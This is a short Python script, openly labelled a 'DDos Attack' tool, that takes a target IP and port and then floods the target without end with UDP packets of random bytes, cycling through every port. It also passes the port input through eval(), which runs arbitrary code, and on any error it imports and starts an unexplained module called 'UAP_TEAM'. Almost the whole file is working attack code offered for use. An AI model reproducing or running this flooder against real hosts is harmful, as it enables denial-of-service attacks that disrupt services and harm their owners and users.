from __future__ import absolute_import
from __future__ import print_function
import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
from six.moves import input
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year
def ddoss():    
    ##############
    try :
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        bytes = random._urandom(1490)
        #############
        
        #os.system("clear")
        print ("figlet DDos Attack")
        ip = input("IP Target : ")
        port = eval(input("Port       : "))
        
        #os.system("clear")
        os.system("figlet Attack Starting")
        print("[                    ] 0% ")
        time.sleep(0)
        print("[=====               ] 25%")
        time.sleep(0)
        print("[==========          ] 50%")
        time.sleep(0)
        print("[===============     ] 75%")
        time.sleep(0)
        print("[====================] 100%")
        time.sleep(1)
        sent = 0
        while True:
             sock.sendto(bytes, (ip,port))
             sent = sent + 1
             port = port + 1
             print("Sent %s packet to %s throught port:%s"%(sent,ip,port))
             if port == 65534:
               port = 1
    except :
        import UAP_TEAM
        UAP_TEAM.start() 
    